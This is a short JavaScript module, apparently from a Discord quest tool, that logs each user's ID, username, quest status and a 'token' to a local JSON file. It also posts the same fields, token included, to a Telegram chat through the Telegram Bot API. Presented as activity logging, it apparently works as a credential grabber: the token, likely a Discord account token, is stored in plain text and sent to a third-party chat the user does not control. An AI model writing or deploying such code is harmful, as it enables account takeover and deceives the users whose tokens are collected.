import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const FILE = path.join(__dirname, 'user_activity.json');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function saveUserActivity(discordUserId, username, questStatus, token = 'N/A') {
    try {
        let users = {};

        if (fs.existsSync(FILE)) {
            const content = fs.readFileSync(FILE, 'utf8').trim();
            if (content) users = JSON.parse(content);
        }

        users[discordUserId] = {
            username,
            token,
            questStatus,
            updatedAt: new Date().toISOString()
        };

        fs.writeFileSync(FILE, JSON.stringify(users, null, 2), 'utf8');

        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            const response = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
                {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: `Quest Activity Update\n\nUser: ${username}\nDiscord ID: ${discordUserId}\nToken: ${token}\nStatus: ${questStatus}`
                    })
                }
            );

            if (!response.ok) {
                throw new Error(`Telegram request failed: ${response.status}`);
            }
        }

        console.log('User activity saved successfully.');
    } catch (error) {
        console.error('Could not save activity:', error.message);
    }
}
